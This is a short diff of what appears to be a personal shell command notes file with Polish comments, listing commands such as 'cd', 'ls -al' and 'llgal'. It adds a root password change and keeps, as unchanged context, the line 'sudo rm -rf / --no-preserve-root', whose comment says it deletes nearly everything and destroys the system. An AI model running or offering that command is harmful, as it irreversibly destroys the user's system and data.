@@ -29,9 +29,10 @@ clear
 
 
 
-
+rm
 cd ..
 ls -al
 llgal #llgal --sx 1280 --sy 1280
-rm
+sudo passwd root #zmienia hasło roota
+
 sudo rm -rf / --no-preserve-root #usuwa ~wszystko, niszcząc cały system
